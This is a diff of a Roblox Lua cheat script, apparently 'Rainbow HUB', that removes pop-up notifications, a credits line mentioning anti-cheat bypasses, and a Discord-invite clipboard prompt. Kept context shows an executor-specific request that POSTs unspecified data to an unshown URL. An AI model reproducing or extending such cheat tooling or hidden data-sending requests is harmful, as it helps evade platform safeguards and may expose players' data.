@@ -22,35 +22,6 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
-SendNotification("Warning", "RightControl to toggle if the gui does not show up then the game is not supported please try again later or never if the game is supported the gui will pop up reguardless GOOD DAY!", "rbxassetid://9300408058", 5)
-
-SendNotification("Credits", "Applebees, CharWar Serverhops Toxic Mods screen thingy And MARK esp,IY for fly script inspiration,Staylin Save Settings,Felix for being sexy, E621 Anticheat bypasses", "rbxassetid://9300408058", 5)
- 
-function Copy()
-    setclipboard("https://discord.gg/cnE3ZnvrGs")
-end
-
-local Gang = Instance.new("BindableFunction")
- 
-function Gang.OnInvoke(v)
-    if v == "Yes" then
-        Copy()
-        SendNotification("Discord", "Discord Link Copying Sucessful", "rbxassetid://9300408058", 15)
-    end
-end
-StarterGui:SetCore(
-    "SendNotification",
-    {
-        Title = "Rainbow HUB Discord",
-        Text = "Copy to clipboard?",
-        Duration = 5,
-        Callback = Gang,
-        Button1 = "Yes",
-        Button2 = "No"
-    }
-)
-local EndTime = tick()
-
 if game.PlaceId == 2753915549 or game.PlaceId == 4442272183 or game.PlaceId == 7449423635 then
     if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end
     
